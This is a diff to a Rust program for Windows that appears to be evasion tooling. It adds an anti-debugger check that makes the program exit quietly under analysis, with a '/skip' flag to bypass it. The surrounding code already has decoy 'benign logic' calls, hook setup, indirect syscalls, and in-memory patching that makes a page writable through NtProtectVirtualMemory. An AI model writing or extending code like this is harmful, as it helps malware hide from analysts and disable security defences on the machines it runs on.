@@ -18,6 +18,7 @@ pub mod syscall;
 #[path = "indirect_lib.rs"]
 mod indirect_lib;
 mod missed_calls;
+mod nodebug;
 
 use std::{
     ffi::c_void,
@@ -52,6 +53,9 @@ use windows::{
 };
 
 fn main() -> Result<()> {
+    let args: Vec<String> = std::env::args().collect();
+    let skip_checks = args.iter().any(|arg| arg == "/skip");
+
     // exec benign logic
     let logger = benign_utils::Logger::new();
     logger.init();
@@ -59,10 +63,15 @@ fn main() -> Result<()> {
     let _primes = benign_utils::calculate_primes(100);
     let _s = benign_utils::harmless_string_op("initialization");
 
+    if !skip_checks {
+        if nodebug::check_debugger() {
+            return Ok(());
+        }
+    }
+
     unsafe {
         initialize_hooks();
-        // parse cli args
-        let args: Vec<String> = std::env::args().collect();
+        
         let mode = if args.len() > 1 {
             args[1].as_str()
         } else {
@@ -134,7 +143,7 @@ fn main() -> Result<()> {
             // panic!("Failed: 319");
             return Ok(());
         }
-        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
+        let mut old_protect;
         // make page writable
         // VirtualProtect(patch_addr, 1, RWX, &mut old) -> NtProtectVirtualMemory
         let mut base_addr = patch_addr as *mut c_void;
